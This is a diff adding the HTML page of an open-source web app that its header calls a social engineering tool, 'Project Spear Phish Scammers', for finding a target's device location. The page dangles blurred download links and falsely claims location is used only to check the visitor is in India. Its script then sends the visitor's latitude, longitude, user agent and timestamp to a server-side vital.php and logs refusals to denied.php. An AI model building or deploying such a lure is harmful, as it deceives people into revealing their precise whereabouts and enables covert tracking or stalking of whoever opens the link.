@@ -1,0 +1,174 @@
+<!-- Project Spear Phish Scammers is a social engineering web app to find a target's device location.
+    Copyright (C) 2024  Tushar Wagh
+
+    This program is free software: you can redistribute it and/or modify
+    it under the terms of the GNU General Public License as published by
+    the Free Software Foundation, either version 3 of the License, or
+    (at your option) any later version.
+
+    This program is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    GNU General Public License for more details.
+
+    You should have received a copy of the GNU General Public License
+    along with this program.  If not, see https://www.gnu.org/licenses/gpl-3.0.en.html.
+    I am available for queries: cstusharwagh@gmail.com -->
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>Page2 - Project Spear-Phish Scammers</title>
+    <meta property="og:title" content="Page2 - Project Spear-Phish Scammers" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta charset="utf-8" />
+    <meta property="twitter:card" content="summary_large_image" />
+
+    <style data-tag="reset-style-sheet">
+      html {  line-height: 1.15;}body {  margin: 0;}* {  box-sizing: border-box;  border-width: 0;  border-style: solid;}p,li,ul,pre,div,h1,h2,h3,h4,h5,h6,figure,blockquote,figcaption {  margin: 0;  padding: 0;}button {  background-color: transparent;}button,input,optgroup,select,textarea {  font-family: inherit;  font-size: 100%;  line-height: 1.15;  margin: 0;}button,select {  text-transform: none;}button,[type="button"],[type="reset"],[type="submit"] {  -webkit-appearance: button; appearance: button;}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner {  border-style: none;  padding: 0;}button:-moz-focus,[type="button"]:-moz-focus,[type="reset"]:-moz-focus,[type="submit"]:-moz-focus {  outline: 1px dotted ButtonText;}a {  color: inherit;  text-decoration: inherit;}input {  padding: 2px 4px;}img {  display: block;}html { scroll-behavior: smooth  }
+    </style>
+    <style data-tag="default-style-sheet">
+      html {
+        font-family: Noto Sans;
+        font-size: 16px;
+      }
+
+      body {
+        font-weight: 400;
+        font-style:normal;
+        text-decoration: none;
+        text-transform: none;
+        letter-spacing: normal;
+        line-height: 1.15;
+        color: var(--dl-color-theme-neutral-dark);
+        background-color: var(--dl-color-theme-neutral-light);
+
+        fill: var(--dl-color-theme-neutral-dark);
+      }
+    </style>
+    <link
+      rel="stylesheet"
+      href="https://unpkg.com/animate.css@4.1.1/animate.css"
+    />
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=STIX+Two+Text:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&amp;display=swap"
+      data-tag="font"
+    />
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Noto+Sans:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap"
+      data-tag="font"
+    />
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Exo+2:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap"
+      data-tag="font"
+    />
+    <link
+      rel="stylesheet"
+      href="https://unpkg.com/@teleporthq/teleport-custom-scripts/dist/style.css"
+    />
+  </head>
+  <body>
+    <link rel="stylesheet" href="./style.css" />
+    <div>
+      <link href="./page2.css" rel="stylesheet" />
+
+      <div class="page2-container">
+        <div class="page2-container1">
+          <div class="page2-container2">
+            <span class="page2-text">
+              <span class="page2-text01">
+                Tip: Box still blurry? Allow Location, then click the link inside the box
+              </span>
+              <br />
+              <br />
+              <span>Click "Allow"</span>
+              <br />
+            </span>
+            <div class="page2-container3">
+              <button
+                type="button"
+                id="button-animate"
+                class="page2-button button"
+                onclick="requestLocationPermission()"
+              >
+                <span class="page2-text06">
+                  <span>Allow</span>
+                  <br />
+                </span>
+              </button>
+              <span class="page2-text09">
+                💡We use your location only to verify if you're in India
+              </span>
+            </div>
+          </div>
+          <div class="page2-blurry-container" id="blurry-container">
+            <ul class="page2-ul list">
+              <li class="list-item">
+                <span>
+                  <span>Mega Link here</span>
+                  <br />
+                </span>
+              </li>
+              <li class="list-item">
+                <span>
+                  <span>Gdrive link here</span>
+                  <br />
+                </span>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+    <script>
+      const button = document.getElementById('button-animate');
+        //the button animation only works once after clicked, and needs a page refresh to work again
+        //this script was add to for it to work several times(unlimited) without refreshing the page
+        
+      button.addEventListener('click', function() {
+        // Remove the animation class
+        button.classList.remove('page2-button');
+  
+        // Trigger a reflow (force browser to repaint)
+        void button.offsetWidth;
+  
+        // Add the animation class back
+        button.classList.add('page2-button');
+      });
+    </script>
+    <script>
+        function requestLocationPermission() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function (position) {
+                        // Location permission granted
+                        document.getElementById('blurry-container').style.filter = 'none'; // Remove blur
+                        document.getElementById('blurry-container').style.pointerEvents = 'auto'; // Make clickable
+                        document.getElementById('blurry-container').style.userSelect = 'text'; // Allow text selection
+                        const now = new Date().toISOString();
+                        const xhttp = new XMLHttpRequest();
+                        xhttp.open("GET", "vital.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&uagent=" + navigator.userAgent + "&time=" + now);
+                        xhttp.send()
+                    },
+                    function (error) {
+                        // When Location permission is denied
+                        const xhttp = new XMLHttpRequest();
+                        xhttp.open("GET", "denied.php?");
+                        xhttp.send()
+                        console.error('Location permission denied:', error);
+                    }
+                );
+            } else {
+                console.error('Geolocation is not supported by this browser.');
+            }
+        }
+    </script>
+    <script
+      defer=""
+      src="https://unpkg.com/@teleporthq/teleport-custom-scripts"
+    ></script>
+  </body>
+</html>
